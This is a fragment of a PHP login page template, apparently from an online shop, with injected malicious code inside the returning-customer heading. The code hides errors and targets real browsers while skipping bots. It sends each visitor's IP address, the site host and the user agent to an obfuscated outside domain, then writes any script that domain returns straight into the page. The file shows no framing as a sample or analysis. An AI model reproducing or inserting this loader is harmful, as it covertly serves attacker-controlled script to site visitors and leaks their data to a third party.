...
<div class="contentContainer" style="width: 45%; float: left; border-left: 1px dashed #ccc; padding-left: 3%; margin-left: 3%;">
  <h2><?php echo HEADING_RETURNING_CUSTOMER; ?>
<?php
#dbc14b#
error_reporting(0); ini_set('display_errors',0); $wp_n5047 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_n5047) && !preg_match ('/bot/i', $wp_n5047))){
$wp_n095047="http://"."tag"."display".".com/display"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_n5047);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_n095047);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_5047n = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_5047n,1,3) === 'scr' ){ echo $wp_5047n; }
#/dbc14b#
?>
<?php
